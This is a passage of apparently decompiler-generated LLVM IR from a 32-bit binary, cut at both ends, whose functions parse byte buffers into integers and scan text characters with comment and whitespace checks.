  store i32 %v2_1000c5ac, i32* %r0.global-to-local, align 4
  %v1_1000c5b0 = load i32, i32* @r31, align 4
  %v2_1000c5b0 = add i32 %v1_1000c5b0, 4
  %v3_1000c5b0 = inttoptr i32 %v2_1000c5b0 to i32*
  store i32 %v2_1000c5ac, i32* %v3_1000c5b0, align 4
  %v0_1000c5b4 = load i32, i32* @r30, align 4
  %v1_1000c5b4 = add i32 %v0_1000c5b4, 2
  %v2_1000c5b4 = inttoptr i32 %v1_1000c5b4 to i8*
  %v3_1000c5b4 = load i8, i8* %v2_1000c5b4, align 1
  %v4_1000c5b4 = zext i8 %v3_1000c5b4 to i32
  store i32 %v4_1000c5b4, i32* %r0.global-to-local, align 4
  %v0_1000c5b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5b8 = add i32 %v0_1000c5b8, 1
  %v2_1000c5b8 = inttoptr i32 %v1_1000c5b8 to i8*
  %v3_1000c5b8 = load i8, i8* %v2_1000c5b8, align 1
  %v4_1000c5b8 = zext i8 %v3_1000c5b8 to i32
  store i32 %v4_1000c5b8, i32* %r9.global-to-local, align 4
  %v1_1000c5bc = mul nuw nsw i32 %v4_1000c5b4, 256
  %v2_1000c5c0 = or i32 %v4_1000c5b8, %v1_1000c5bc
  store i32 %v2_1000c5c0, i32* %r0.global-to-local, align 4
  %v1_1000c5c4 = load i32, i32* @r31, align 4
  %v2_1000c5c4 = add i32 %v1_1000c5c4, 8
  %v3_1000c5c4 = inttoptr i32 %v2_1000c5c4 to i32*
  store i32 %v2_1000c5c0, i32* %v3_1000c5c4, align 4
  %v0_1000c5c8 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5c8 = add i32 %v0_1000c5c8, 2
  %v2_1000c5c8 = inttoptr i32 %v1_1000c5c8 to i8*
  %v3_1000c5c8 = load i8, i8* %v2_1000c5c8, align 1
  %v4_1000c5c8 = zext i8 %v3_1000c5c8 to i32
  store i32 %v4_1000c5c8, i32* %r0.global-to-local, align 4
  %v0_1000c5cc = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c5cc = add i32 %v0_1000c5cc, 1
  %v2_1000c5cc = inttoptr i32 %v1_1000c5cc to i8*
  %v3_1000c5cc = load i8, i8* %v2_1000c5cc, align 1
  %v4_1000c5cc = zext i8 %v3_1000c5cc to i32
  %v1_1000c5d0 = add i32 %v0_1000c5cc, 3
  %v2_1000c5d0 = inttoptr i32 %v1_1000c5d0 to i8*
  %v3_1000c5d0 = load i8, i8* %v2_1000c5d0, align 1
  %v4_1000c5d0 = zext i8 %v3_1000c5d0 to i32
  %v1_1000c5d4 = add i32 %v0_1000c5cc, 2
  %v2_1000c5d4 = inttoptr i32 %v1_1000c5d4 to i8*
  %v3_1000c5d4 = load i8, i8* %v2_1000c5d4, align 1
  %v4_1000c5d4 = zext i8 %v3_1000c5d4 to i32
  %v1_1000c5d8 = mul nuw i32 %v4_1000c5c8, 16777216
  %v1_1000c5dc = mul nuw nsw i32 %v4_1000c5cc, 65536
  %v2_1000c5e0 = or i32 %v1_1000c5dc, %v1_1000c5d8
  %v2_1000c5e4 = or i32 %v2_1000c5e0, %v4_1000c5d0
  store i32 %v2_1000c5e4, i32* %r0.global-to-local, align 4
  %v1_1000c5e8 = mul nuw nsw i32 %v4_1000c5d4, 256
  %v2_1000c5ec = or i32 %v1_1000c5e8, %v2_1000c5e4
  store i32 %v2_1000c5ec, i32* %r9.global-to-local, align 4
  %v1_1000c5f0 = load i32, i32* @r31, align 4
  %v2_1000c5f0 = add i32 %v1_1000c5f0, 12
  %v3_1000c5f0 = inttoptr i32 %v2_1000c5f0 to i32*
  store i32 %v2_1000c5ec, i32* %v3_1000c5f0, align 4
  %v0_1000c5f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000c5f4 = add i32 %v0_1000c5f4, 6
  %v2_1000c5f4 = inttoptr i32 %v1_1000c5f4 to i8*
  %v3_1000c5f4 = load i8, i8* %v2_1000c5f4, align 1
  %v4_1000c5f4 = zext i8 %v3_1000c5f4 to i32
  store i32 %v4_1000c5f4, i32* %r9.global-to-local, align 4
  %v0_1000c5f8 = load i32, i32* @r30, align 4
  %v1_1000c5f8 = add i32 %v0_1000c5f8, 9
  %v2_1000c5f8 = inttoptr i32 %v1_1000c5f8 to i8*
  %v3_1000c5f8 = load i8, i8* %v2_1000c5f8, align 1
  %v4_1000c5f8 = zext i8 %v3_1000c5f8 to i32
  store i32 %v4_1000c5f8, i32* %r0.global-to-local, align 4
  %v0_1000c5fc = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c5fc = load i32, i32* @r31, align 4
  %v2_1000c5fc = add i32 %v1_1000c5fc, 24
  %v3_1000c5fc = inttoptr i32 %v2_1000c5fc to i32*
  store i32 %v0_1000c5fc, i32* %v3_1000c5fc, align 4
  %v0_1000c600 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c600 = mul i32 %v0_1000c600, 256
  store i32 %v1_1000c600, i32* %r9.global-to-local, align 4
  %v0_1000c604 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c604 = load i32, i32* @r31, align 4
  %v2_1000c604 = add i32 %v1_1000c604, 20
  %v3_1000c604 = inttoptr i32 %v2_1000c604 to i32*
  store i32 %v0_1000c604, i32* %v3_1000c604, align 4
  %v0_1000c608 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c608 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c608 = or i32 %v1_1000c608, %v0_1000c608
  store i32 %v2_1000c608, i32* %r9.global-to-local, align 4
  %v0_1000c60c = load i32, i32* @r29, align 4
  %v2_1000c60c = icmp slt i32 %v0_1000c60c, %v2_1000c608
  %v1_1000c610 = add i32 %v2_1000c608, 10
  store i32 %v1_1000c610, i32* %r0.global-to-local, align 4
  %v0_1000c614 = load i32, i32* @r27, align 4
  %v2_1000c614 = add i32 %v0_1000c614, %v1_1000c610
  store i32 %v2_1000c614, i32* @r27, align 4
  %v1_1000c618 = load i32, i32* @r31, align 4
  %v2_1000c618 = add i32 %v1_1000c618, 16
  %v3_1000c618 = inttoptr i32 %v2_1000c618 to i32*
  store i32 %v2_1000c608, i32* %v3_1000c618, align 4
  br i1 %v2_1000c60c, label %dec_label_pc_1000c620, label %dec_label_pc_1000c588.dec_label_pc_1000c624_crit_edge

dec_label_pc_1000c588.dec_label_pc_1000c624_crit_edge: ; preds = %dec_label_pc_1000c588
  %v0_1000c628.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c620:                            ; preds = %dec_label_pc_1000c588
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_1000c624

dec_label_pc_1000c624:                            ; preds = %dec_label_pc_1000c588.dec_label_pc_1000c624_crit_edge, %dec_label_pc_1000c52c, %dec_label_pc_1000c580, %dec_label_pc_1000c620
  %v0_1000c628 = phi i32 [ %v0_1000c628.pre, %dec_label_pc_1000c588.dec_label_pc_1000c624_crit_edge ], [ %v2_1000c558, %dec_label_pc_1000c52c ], [ %v1_1000c568, %dec_label_pc_1000c580 ], [ -1, %dec_label_pc_1000c620 ]
  store i32 %v0_1000c530, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000c628

; uselistorder directives
  uselistorder i32 %v2_1000c608, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000c568, { 1, 2, 0 }
  uselistorder i32 %v2_1000c558, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000c538, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 20, { 16, 17, 18, 19, 1, 23, 20, 21, 24, 25, 26, 27, 10, 11, 13, 12, 0, 37, 38, 28, 29, 30, 31, 32, 34, 35, 33, 36, 22, 4, 14, 5, 3, 2, 6, 15, 7, 8, 9 }
  uselistorder i32 9, { 11, 12, 13, 14, 2, 0, 15, 3, 16, 4, 17, 18, 19, 20, 5, 21, 22, 1, 6, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @function_100073ac, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c624, { 3, 0, 2, 1 }
}

define i32 @function_1000c63c() local_unnamed_addr {
dec_label_pc_1000c63c:
  %v0_1000c640 = load i32, i32* @lr, align 4
  store i32 268486244, i32* @lr, align 4
  %v3_1000c660 = call i32 @function_10004ca0(i32 ptrtoint ([11 x i8]* @global_var_1000f3b0.341 to i32), i32 ptrtoint (i32* @global_var_1000f34c.311 to i32))
  %v3_1000c668 = icmp eq i32 %v3_1000c660, 0
  br i1 %v3_1000c668, label %dec_label_pc_1000c670, label %dec_label_pc_1000c68c

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c63c
  %v0_1000c664 = load i32, i32* @r29, align 4
  store i32 %v0_1000c640, i32* @lr, align 4
  %v3_1000c688 = call i32 @function_10004ca0(i32 ptrtoint ([18 x i8]* @global_var_1000f3bc.342 to i32), i32 %v0_1000c664)
  br label %dec_label_pc_1000c68c

dec_label_pc_1000c68c:                            ; preds = %dec_label_pc_1000c63c, %dec_label_pc_1000c670
  %v0_1000c69c = phi i32 [ %v3_1000c660, %dec_label_pc_1000c63c ], [ %v3_1000c688, %dec_label_pc_1000c670 ]
  ret i32 %v0_1000c69c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10004ca0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c68c, { 1, 0 }
}

define i32 @function_1000c6a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1000c6a0:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg7, i32* %r9.global-to-local, align 4
  %tmp = ptrtoint i32* %arg5 to i32
  %v0_1000c6a4 = load i32, i32* @lr, align 4
  %v1_1000c6ac = sub i32 0, %arg6
  %v1_1000c6b0 = urem i32 %v1_1000c6ac, 4
  store i32 %v1_1000c6b0, i32* %r0.global-to-local, align 4
  %v3_1000c6b0 = icmp eq i32 %v1_1000c6b0, 0
  store i32 %arg6, i32* @r30, align 4
  store i32 %arg1, i32* @r20, align 4
  store i32 %arg2, i32* %r15.global-to-local, align 4
  store i32 %arg3, i32* %r19.global-to-local, align 4
  store i32 %arg4, i32* %r18.global-to-local, align 4
  store i32 %tmp, i32* @r28, align 4
  %v0_1000c6d0 = load i32, i32* @r10, align 4
  store i32 %v0_1000c6d0, i32* %r17.global-to-local, align 4
  store i32 %arg8, i32* %r16.global-to-local, align 4
  %v0_1000c6ec.pr = load i32, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c6b0, label %dec_label_pc_1000c6ec, label %dec_label_pc_1000c6dc

dec_label_pc_1000c6dc:                            ; preds = %dec_label_pc_1000c6a0
  %v2_1000c6dc = icmp ult i32 %v0_1000c6ec.pr, %v1_1000c6b0
  br i1 %v2_1000c6dc, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c6e4

dec_label_pc_1000c6e4:                            ; preds = %dec_label_pc_1000c6dc
  %v2_1000c6e4 = sub i32 %v0_1000c6ec.pr, %v1_1000c6b0
  store i32 %v2_1000c6e4, i32* %r9.global-to-local, align 4
  %v2_1000c6e8 = add i32 %v1_1000c6b0, %arg6
  store i32 %v2_1000c6e8, i32* @r30, align 4
  br label %dec_label_pc_1000c6ec

dec_label_pc_1000c6ec:                            ; preds = %dec_label_pc_1000c6a0, %dec_label_pc_1000c6e4
  %v0_1000c6f8 = phi i32 [ %v2_1000c6e8, %dec_label_pc_1000c6e4 ], [ %arg6, %dec_label_pc_1000c6a0 ]
  %v0_1000c6fc = phi i32 [ %v2_1000c6e4, %dec_label_pc_1000c6e4 ], [ %v0_1000c6ec.pr, %dec_label_pc_1000c6a0 ]
  %tmp49 = icmp ult i32 %v0_1000c6fc, 32
  br i1 %tmp49, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c6f4

dec_label_pc_1000c6f4:                            ; preds = %dec_label_pc_1000c6ec
  %v3_1000c6f4 = icmp eq i32 %arg4, 1
  %v1_1000c6f8 = add i32 %v0_1000c6f8, 32
  store i32 %v1_1000c6f8, i32* @r24, align 4
  %v1_1000c6fc = add i32 %v0_1000c6fc, -32
  store i32 %v1_1000c6fc, i32* @r27, align 4
  br i1 %v3_1000c6f4, label %dec_label_pc_1000c7fc, label %dec_label_pc_1000c704

dec_label_pc_1000c704:                            ; preds = %dec_label_pc_1000c6f4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1000c70c = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_1000c70c, align 4
  %tmp50 = icmp ult i32 %v1_1000c6fc, 4
  br i1 %tmp50, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c714

dec_label_pc_1000c714:                            ; preds = %dec_label_pc_1000c704
  %v0_1000c714 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c714 = add i32 %v0_1000c714, -36
  store i32 %v1_1000c714, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_1000c714, 8
  br i1 %tmp51, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c720

dec_label_pc_1000c720:                            ; preds = %dec_label_pc_1000c714
  %v0_1000c720 = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1000c720, 16
  br i1 %tmp52, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c728

dec_label_pc_1000c728:                            ; preds = %dec_label_pc_1000c720
  %v1_1000c728 = add i32 %v0_1000c714, -48
  store i32 %v1_1000c728, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_1000c728, 8
  br i1 %tmp53, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c734

dec_label_pc_1000c734:                            ; preds = %dec_label_pc_1000c728
  %v1_1000c734 = add i32 %v0_1000c714, -56
  store i32 %v1_1000c734, i32* %r0.global-to-local, align 4
  %v1_1000c738 = add i32 %v0_1000c714, -44
  store i32 %v1_1000c738, i32* @r27, align 4
  %v3_1000c73c = icmp ugt i32 %v1_1000c734, %v1_1000c738
  %v0_1000c740 = load i32, i32* @r30, align 4
  %v1_1000c740 = add i32 %v0_1000c740, 36
  store i32 %v1_1000c740, i32* @r29, align 4
  %v1_1000c744 = add i32 %v0_1000c740, 48
  store i32 %v1_1000c744, i32* @r26, align 4
  br i1 %v3_1000c73c, label %dec_label_pc_1000c758, label %dec_label_pc_1000c750

dec_label_pc_1000c750:                            ; preds = %dec_label_pc_1000c734
  store i32 %v1_1000c734, i32* @r27, align 4
  br label %dec_label_pc_1000c758

dec_label_pc_1000c758:                            ; preds = %dec_label_pc_1000c734, %dec_label_pc_1000c750
  %v0_1000c758 = phi i32 [ %v1_1000c734, %dec_label_pc_1000c750 ], [ %v1_1000c738, %dec_label_pc_1000c734 ]
  %tmp54 = icmp ult i32 %v0_1000c758, 80
  br i1 %tmp54, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c760

dec_label_pc_1000c760:                            ; preds = %dec_label_pc_1000c758
  store i32 268486500, i32* @lr, align 4
  %v0_1000c760 = call i32 @function_1000c63c()
  store i32 %v0_1000c760, i32* @r20, align 4
  %v3_1000c764 = icmp eq i32 %v0_1000c760, 0
  br i1 %v3_1000c764, label %dec_label_pc_1000c784, label %dec_label_pc_1000c76c

dec_label_pc_1000c76c:                            ; preds = %dec_label_pc_1000c760
  %v0_1000c76c = load i32, i32* @r24, align 4
  store i32 %v0_1000c76c, i32* @r25, align 4
  %v0_1000c774 = load i32, i32* @r26, align 4
  store i32 %v0_1000c774, i32* @r23, align 4
  %v0_1000c778 = load i32, i32* @r31, align 4
  store i32 %v0_1000c778, i32* @r24, align 4
  store i32 %v0_1000c76c, i32* %r21.global-to-local, align 4
  %v1_1000c814.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_1000c80c

dec_label_pc_1000c784:                            ; preds = %dec_label_pc_1000c760
  %v1_1000c784 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000c784 = inttoptr i32 %v1_1000c784 to i32*
  store i32 0, i32* %v2_1000c784, align 4
  %v0_1000c788 = call i32 @function_10004b48()
  %v1_1000c78c = inttoptr i32 %v0_1000c788 to i32*
  %v2_1000c78c = load i32, i32* %v1_1000c78c, align 4
  store i32 %v2_1000c78c, i32* @r26, align 4
  br label %dec_label_pc_1000c9a4

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c934
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000c798 = load i32, i32* @r25, align 4
  %v1_1000c798 = load i32, i32* @r22, align 4
  %v2_1000c798 = inttoptr i32 %v1_1000c798 to i32*
  store i32 %v0_1000c798, i32* %v2_1000c798, align 4
  %v0_1000c79c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c79c = load i32, i32* @r22, align 4
  %v2_1000c79c = add i32 %v1_1000c79c, 4
  %v3_1000c79c = inttoptr i32 %v2_1000c79c to i32*
  store i32 %v0_1000c79c, i32* %v3_1000c79c, align 4
  %v0_1000c7a0 = load i32, i32* @r30, align 4
  %v1_1000c7a0 = add i32 %v0_1000c7a0, 8
  store i32 %v1_1000c7a0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000c7a8 = add i32 %v0_1000c7a0, 4
  %v2_1000c7a8 = inttoptr i32 %v1_1000c7a8 to i32*
  %v3_1000c7a8 = load i32, i32* %v2_1000c7a8, align 4
  store i32 %v3_1000c7a8, i32* %r0.global-to-local, align 4
  %v0_1000c7ac = load i32, i32* %r19.global-to-local, align 4
  %v1_1000c7ac = load i32, i32* @r28, align 4
  %v2_1000c7ac = add i32 %v1_1000c7ac, 8
  %v3_1000c7ac = inttoptr i32 %v2_1000c7ac to i32*
  store i32 %v0_1000c7ac, i32* %v3_1000c7ac, align 4
  %v0_1000c7b0 = load i32, i32* @r22, align 4
  %v1_1000c7b0 = load i32, i32* @r28, align 4
  %v2_1000c7b0 = add i32 %v1_1000c7b0, 16
  %v3_1000c7b0 = inttoptr i32 %v2_1000c7b0 to i32*
  store i32 %v0_1000c7b0, i32* %v3_1000c7b0, align 4
  %v0_1000c7b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7b4 = load i32, i32* @r28, align 4
  %v2_1000c7b4 = inttoptr i32 %v1_1000c7b4 to i32*
  store i32 %v0_1000c7b4, i32* %v2_1000c7b4, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000c7bc = load i32, i32* @r28, align 4
  %v2_1000c7bc = add i32 %v1_1000c7bc, 12
  %v3_1000c7bc = inttoptr i32 %v2_1000c7bc to i32*
  store i32 4, i32* %v3_1000c7bc, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7c4:                            ; preds = %dec_label_pc_1000c958
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000c7c8 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000c7c8 = load i32, i32* @r23, align 4
  %v2_1000c7c8 = inttoptr i32 %v1_1000c7c8 to i32*
  store i32 %v0_1000c7c8, i32* %v2_1000c7c8, align 4
  %v0_1000c7cc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7cc = load i32, i32* @r23, align 4
  %v2_1000c7cc = add i32 %v1_1000c7cc, 4
  %v3_1000c7cc = inttoptr i32 %v2_1000c7cc to i32*
  store i32 %v0_1000c7cc, i32* %v3_1000c7cc, align 4
  %v0_1000c7d0 = load i32, i32* @r30, align 4
  %v1_1000c7d0 = add i32 %v0_1000c7d0, 8
  store i32 %v1_1000c7d0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_1000c7d8 = add i32 %v0_1000c7d0, 4
  %v2_1000c7d8 = inttoptr i32 %v1_1000c7d8 to i32*
  %v3_1000c7d8 = load i32, i32* %v2_1000c7d8, align 4
  store i32 %v3_1000c7d8, i32* %r0.global-to-local, align 4
  %v0_1000c7dc = load i32, i32* %r19.global-to-local, align 4
  %v1_1000c7dc = load i32, i32* @r28, align 4
  %v2_1000c7dc = add i32 %v1_1000c7dc, 8
  %v3_1000c7dc = inttoptr i32 %v2_1000c7dc to i32*
  store i32 %v0_1000c7dc, i32* %v3_1000c7dc, align 4
  %v0_1000c7e0 = load i32, i32* @r23, align 4
  %v1_1000c7e0 = load i32, i32* @r28, align 4
  %v2_1000c7e0 = add i32 %v1_1000c7e0, 16
  %v3_1000c7e0 = inttoptr i32 %v2_1000c7e0 to i32*
  store i32 %v0_1000c7e0, i32* %v3_1000c7e0, align 4
  %v0_1000c7e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c7e4 = load i32, i32* @r28, align 4
  %v2_1000c7e4 = inttoptr i32 %v1_1000c7e4 to i32*
  store i32 %v0_1000c7e4, i32* %v2_1000c7e4, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1000c7ec = load i32, i32* @r28, align 4
  %v2_1000c7ec = add i32 %v1_1000c7ec, 12
  %v3_1000c7ec = inttoptr i32 %v2_1000c7ec to i32*
  store i32 16, i32* %v3_1000c7ec, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c794, %dec_label_pc_1000c7c4
  %v0_1000c7f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c7f0 = load i32, i32* @r28, align 4
  %v2_1000c7f0 = add i32 %v1_1000c7f0, 4
  %v3_1000c7f0 = inttoptr i32 %v2_1000c7f0 to i32*
  store i32 %v0_1000c7f0, i32* %v3_1000c7f0, align 4
  %v0_1000c7f4 = load i32, i32* @r28, align 4
  %v1_1000c7f4 = load i32, i32* %r17.global-to-local, align 4
  %v2_1000c7f4 = inttoptr i32 %v1_1000c7f4 to i32*
  store i32 %v0_1000c7f4, i32* %v2_1000c7f4, align 4
  br label %dec_label_pc_1000c98c

dec_label_pc_1000c7fc:                            ; preds = %dec_label_pc_1000c6f4
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_1000c80c

dec_label_pc_1000c80c:                            ; preds = %dec_label_pc_1000c76c, %dec_label_pc_1000c7fc
  %v1_1000c814 = phi i32 [ %v1_1000c814.pre, %dec_label_pc_1000c76c ], [ %arg8, %dec_label_pc_1000c7fc ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_1000c814 = inttoptr i32 %v1_1000c814 to i32*
  store i32 1, i32* %v2_1000c814, align 4
  br label %dec_label_pc_1000c974

dec_label_pc_1000c81c:                            ; preds = %dec_label_pc_1000c974
  %v0_1000c81c = load i32, i32* @r24, align 4
  store i32 %v0_1000c81c, i32* @r3, align 4
  store i32 268486696, i32* @lr, align 4
  %v2_1000c824 = call i32 @function_1000cad4(i32 %v0_1000c81c, i32 35)
  %v4_1000c828 = icmp eq i32 %v2_1000c824, 0
  br i1 %v4_1000c828, label %dec_label_pc_1000c838, label %dec_label_pc_1000c830

dec_label_pc_1000c830:                            ; preds = %dec_label_pc_1000c81c
  %v3_1000c824 = inttoptr i32 %v2_1000c824 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_1000c824, align 1
  br label %dec_label_pc_1000c838

dec_label_pc_1000c838:                            ; preds = %dec_label_pc_1000c81c, %dec_label_pc_1000c830
  %v0_1000c838 = load i32, i32* @r24, align 4
  store i32 %v0_1000c838, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_1000c8b417 = inttoptr i32 %v0_1000c838 to i8*
  %v2_1000c8b418 = load i8, i8* %v1_1000c8b417, align 1
  %v3_1000c8b419 = zext i8 %v2_1000c8b418 to i32
  store i32 %v3_1000c8b419, i32* %r0.global-to-local, align 4
  %v3_1000c8b821 = icmp eq i8 %v2_1000c8b418, 0
  br i1 %v3_1000c8b821, label %dec_label_pc_1000c8c0, label %dec_label_pc_1000c850.preheader

dec_label_pc_1000c844:                            ; preds = %dec_label_pc_1000c860
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_1000c848 = inttoptr i32 %v0_1000c884 to i8*
  store i8 0, i8* %v3_1000c848, align 1
  %v0_1000c84c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c84c = add i32 %v0_1000c84c, 1
  store i32 %v1_1000c84c, i32* %r11.global-to-local, align 4
  %v1_1000c850 = inttoptr i32 %v1_1000c84c to i8*
  %v2_1000c850 = load i8, i8* %v1_1000c850, align 1
  %v3_1000c850 = zext i8 %v2_1000c850 to i32
  store i32 %v3_1000c850, i32* %r0.global-to-local, align 4
  %v3_1000c854 = icmp eq i8 %v2_1000c850, 0
  br i1 %v3_1000c854, label %dec_label_pc_1000c8c0, label %dec_label_pc_1000c860

dec_label_pc_1000c860:                            ; preds = %dec_label_pc_1000c850.preheader, %dec_label_pc_1000c844
  %v0_1000c884 = phi i32 [ %v1_1000c84c, %dec_label_pc_1000c844 ], [ %v0_1000c8502, %dec_label_pc_1000c850.preheader ]
  %v0_1000c868.in = phi i32 [ %v3_1000c850, %dec_label_pc_1000c844 ], [ %v3_1000c8505, %dec_label_pc_1000c850.preheader ]
  %v0_1000c868 = mul nuw nsw i32 %v0_1000c868.in, 2
  %v3_1000c864 = load i32, i32* @global_var_1001044c, align 4
  store i32 %v3_1000c864, i32* %r9.global-to-local, align 4
  %v2_1000c868 = add i32 %v3_1000c864, %v0_1000c868
  %v3_1000c868 = inttoptr i32 %v2_1000c868 to i16*
  %v4_1000c868 = load i16, i16* %v3_1000c868, align 2
  %v5_1000c868 = zext i16 %v4_1000c868 to i32
  store i32 %v5_1000c868, i32* %r0.global-to-local, align 4
  %v1_1000c86c = and i32 %v5_1000c868, 32
  store i32 %v1_1000c86c, i32* %r9.global-to-local, align 4
  %v3_1000c86c = icmp eq i32 %v1_1000c86c, 0
  br i1 %v3_1000c86c, label %dec_label_pc_1000c874, label %dec_label_pc_1000c844

dec_label_pc_1000c874:                            ; preds = %dec_label_pc_1000c860
  %v0_1000c874 = load i32, i32* @r29, align 4
  %v2_1000c874 = icmp sgt i32 %v0_1000c874, 6
  br i1 %v2_1000c874, label %dec_label_pc_1000c890.preheader, label %dec_label_pc_1000c87c

dec_label_pc_1000c87c:                            ; preds = %dec_label_pc_1000c874
  %v1_1000c87c = mul i32 %v0_1000c874, 4
  store i32 %v1_1000c87c, i32* %r0.global-to-local, align 4
  %v1_1000c880 = add i32 %v0_1000c874, 1
  store i32 %v1_1000c880, i32* @r29, align 4
  %v1_1000c884 = load i32, i32* @r30, align 4
  %v3_1000c884 = add i32 %v1_1000c884, %v1_1000c87c
  %v4_1000c884 = inttoptr i32 %v3_1000c884 to i32*
  store i32 %v0_1000c884, i32* %v4_1000c884, align 4
  %v0_1000c8909.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c890.preheader

dec_label_pc_1000c890.preheader:                  ; preds = %dec_label_pc_1000c87c, %dec_label_pc_1000c874
  %v0_1000c8909 = phi i32 [ %v0_1000c8909.pre, %dec_label_pc_1000c87c ], [ %v0_1000c884, %dec_label_pc_1000c874 ]
  %v1_1000c89010 = inttoptr i32 %v0_1000c8909 to i8*
  %v2_1000c89011 = load i8, i8* %v1_1000c89010, align 1
  %v3_1000c89012 = zext i8 %v2_1000c89011 to i32
  store i32 %v3_1000c89012, i32* %r0.global-to-local, align 4
  %v3_1000c89414 = icmp eq i8 %v2_1000c89011, 0
  br i1 %v3_1000c89414, label %dec_label_pc_1000c8b4.loopexit, label %dec_label_pc_1000c8a0.lr.ph

dec_label_pc_1000c8a0.lr.ph:                      ; preds = %dec_label_pc_1000c890.preheader
  %v3_1000c8a4.pre = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_1000c8a0

dec_label_pc_1000c88c:                            ; preds = %dec_label_pc_1000c8a0
  %v1_1000c88c = add i32 %v0_1000c88c, 1
  store i32 %v1_1000c88c, i32* %r11.global-to-local, align 4
  %v1_1000c890 = inttoptr i32 %v1_1000c88c to i8*
  %v2_1000c890 = load i8, i8* %v1_1000c890, align 1
  %v3_1000c890 = zext i8 %v2_1000c890 to i32
  store i32 %v3_1000c890, i32* %r0.global-to-local, align 4
  %v3_1000c894 = icmp eq i8 %v2_1000c890, 0
  br i1 %v3_1000c894, label %dec_label_pc_1000c8b4.loopexit, label %dec_label_pc_1000c8a0

dec_label_pc_1000c8a0:                            ; preds = %dec_label_pc_1000c8a0.lr.ph, %dec_label_pc_1000c88c
  %v0_1000c88c = phi i32 [ %v0_1000c8909, %dec_label_pc_1000c8a0.lr.ph ], [ %v1_1000c88c, %dec_label_pc_1000c88c ]
  %v0_1000c8a8.in = phi i32 [ %v3_1000c89012, %dec_label_pc_1000c8a0.lr.ph ], [ %v3_1000c890, %dec_label_pc_1000c88c ]
  %v0_1000c8a8 = mul nuw nsw i32 %v0_1000c8a8.in, 2
  store i32 %v3_1000c8a4.pre, i32* %r9.global-to-local, align 4
  %v2_1000c8a8 = add i32 %v0_1000c8a8, %v3_1000c8a4.pre
  %v3_1000c8a8 = inttoptr i32 %v2_1000c8a8 to i16*
  %v4_1000c8a8 = load i16, i16* %v3_1000c8a8, align 2
  %v5_1000c8a8 = zext i16 %v4_1000c8a8 to i32
  store i32 %v5_1000c8a8, i32* %r0.global-to-local, align 4
